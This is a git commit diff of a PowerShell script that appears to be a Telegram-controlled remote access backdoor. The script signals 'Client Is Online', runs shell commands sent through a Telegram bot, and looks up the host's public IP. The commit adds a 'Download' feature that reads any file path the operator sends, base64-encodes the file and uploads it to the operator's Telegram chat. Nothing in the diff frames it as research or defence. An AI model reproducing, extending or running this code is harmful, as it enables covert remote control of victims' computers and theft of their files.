74addac631ee77b17ebd3950bfbce1d466a8dd28
HamidReza Mohseniyan <82676693+jxroot@users.noreply.github.com>
2024-06-16 16:20:02 +0330

    Update app.ps1

--- app.ps1
+++ app.ps1
@@ -3,7 +3,8 @@ $botToken = ""
 $chatId = ""
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $ErrorActionPreference = 'silentlycontinue'
-$UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
+$UAG = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
+
 # Initial offset for updates
 $offset = 1
 # Function to send a message with buttons
@@ -23,7 +24,34 @@ function Send-TelegramMessage {
     Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -UserAgent $UAG -ContentType "application/json" -Body ($params | ConvertTo-Json -Compress) | Out-Null
 }
 
+function Download-TelegramFiles {
+    param (
+        [string]$filePath
+    )
+    $apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
+    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $fileBase64 = [Convert]::ToBase64String($fileContent)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $lf = "`r`n"
+    $headers = @{}
+    $headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
+    $bodyLines += ""
+    $bodyLines += "$chatId"
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
+    $bodyLines += "Content-Type: application/octet-stream"
+    $bodyLines += ""
+    $bodyLines += "$fileBase64"
+    $bodyLines += "--$boundary--"
+    $body = $bodyLines -join $lf
+    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -UserAgent $UAG -Headers $headers -Body $body | Out-String 
+    
 
+}
 # Function to handle incoming updates
 function Get-TelegramUpdates {
     param (
@@ -58,7 +86,7 @@ $main_buttons = @{
     one_time_keyboard = $true
     resize_keyboard   = $true
 }
-$shell_buttons = @{
+$back_buttons = @{
     keyboard          = @(
         @( { Back }),
         @( )
@@ -68,7 +96,7 @@ $shell_buttons = @{
 }
 
 
-# if wana work like scheduled task after client online run previous task disable  Delete-TelegramMessage function 
+
 Delete-TelegramMessage
 Send-TelegramMessage -chatId $chatId -text 'Client Is Online (:'  -replyMarkup $main_buttons 
 # Main loop to process updates
@@ -93,7 +121,7 @@ while ($true) {
                 "SHELL" {
                  
                 
-                    Send-TelegramMessage -chatId $chatId -text "Send Powershell Command (:"-replyMarkup $shell_buttons 
+                    Send-TelegramMessage -chatId $chatId -text "Send Powershell Command (:"-replyMarkup $back_buttons 
 
                  
 
@@ -123,7 +151,6 @@ while ($true) {
                                 }
                         
                                 Send-TelegramMessage -chatId $chatId -text $exec
-                                
 
                             }
                         }
@@ -146,9 +173,38 @@ while ($true) {
                     Send-TelegramMessage -chatId $chatId -text $exec
                 }
                 "Download" {
-                    # next update
-                    $exec = Invoke-RestMethod -UserAgent $UAG https://ident.me | Out-String 
-                    Send-TelegramMessage -chatId $chatId -text $exec
+                    Send-TelegramMessage -chatId $chatId -text "Send Files Path" -replyMarkup $back_buttons 
+                    while ($true) {
+                        if ($messageText -eq "Back" ) {
+                            break
+                        }
+                        $updates = Get-TelegramUpdates -offset $offset
+
+                        foreach ($update in $updates) {
+                            $offset = $update.update_id + 1
+                    
+                            if ($update.message) {
+                                $chatId = $update.message.chat.id
+                                $messageText = $update.message.text
+                                if ($messageText -eq "Back" ) {
+                                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
+                                    break
+                                }
+
+                                if (Test-Path $messageText -PathType Leaf) {
+                                    Download-TelegramFiles -filePath $messageText
+                                }
+                                else {
+                                    Send-TelegramMessage -chatId $chatId -text "File does not exist: $messageText"
+                                }
+                              
+                            }
+                        }
+                 
+
+   
+                    }
+   
                 }
                 "Upload" {
                     # next update
@@ -161,5 +217,4 @@ while ($true) {
             }
         }
     }
-   
 }
